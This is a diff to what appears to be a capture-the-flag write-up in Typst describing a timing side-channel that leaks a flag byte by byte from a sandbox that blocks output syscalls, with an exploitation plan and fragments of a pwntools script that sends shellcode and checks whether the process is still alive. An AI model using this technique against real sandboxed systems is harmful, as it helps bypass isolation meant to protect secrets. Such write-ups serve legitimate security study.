@@ -4,7 +4,7 @@
     description: "Using an infinite calculation loop to create a timing side-channel for leaking data when all traditional output syscalls are blocked.",
     date: "2025-12-30",
     order: 12,
-    draft: false,
+    draft: true,
   ),
 )<frontmatter>
 #import "../../../../typst-theme.c.typ": project
@@ -68,12 +68,12 @@ This difference in "life expectancy" (alive vs. dead) is our side-channel.
 
 == Exploitation Plan
 
-1.  *Read Flag:* Read the flag from the pre-opened FD 3.
-2.  *Compare Byte:* Check if `flag[i] == guess`.
-3.  *Busy Loop:*
-    *   If correct: Enter an infinite loop (`jmp $`).
-    *   If wrong: Trigger a forbidden syscall (e.g., `write`).
-4.  *Measure Time:* The python script waits for a short period (e.g., 0.5s) and checks if the process is still running. If it is, the guess was correct.
+1. *Read Flag:* Read the flag from the pre-opened FD 3.
+2. *Compare Byte:* Check if `flag[i] == guess`.
+3. *Busy Loop:*
+  *   If correct: Enter an infinite loop (`jmp $`).
+  *   If wrong: Trigger a forbidden syscall (e.g., `write`).
+4. *Measure Time:* The python script waits for a short period (e.g., 0.5s) and checks if the process is still running. If it is, the guess was correct.
 
 == Exploit Script
 
@@ -114,10 +114,10 @@ while True:
         # Run process
         p = process([exe, "/flag"], level='error')
         p.send(shellcode)
-        
+
         # Allow it to run for a bit
         time.sleep(0.5)
-        
+
         # Check if it's still alive
         if p.poll() is None:
             # Alive! Correct guess.
@@ -127,11 +127,12 @@ while True:
             p.kill()
             p.close()
             break
-        
+
         p.close()
-    
+
     if not found:
         print("End of flag or char not found.")
         break
     index += 1
+print(f"\nFinal Flag: {flag}")
 ```
